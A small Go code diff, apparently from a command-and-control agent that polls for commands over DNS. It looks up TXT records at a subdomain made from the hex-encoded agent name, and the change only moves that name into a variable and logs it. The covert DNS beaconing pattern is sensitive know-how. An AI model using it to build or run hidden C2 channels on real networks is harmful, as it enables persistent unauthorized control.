@@ -48,8 +48,11 @@ Example:
 			// Wait for the next poll!
 			time.Sleep(time.Second * time.Duration(agentCmdAgentPoll))
 
+			pollDomain := fmt.Sprintf("%x.%s", agentCmdAgentName, options.Domain)
+			log.Debug().Str("poll-domain", pollDomain).Msg("poll domain")
+
 			// Do lookup
-			response := client.Lookup(fmt.Sprintf("%x.%s", agentCmdAgentName, options.Domain), dns.TypeTXT)
+			response := client.Lookup(pollDomain, dns.TypeTXT)
 
 			// Do nothing.
 			if strings.Contains(response.Data, protocol.NoCmdTxtResponse[0]) {
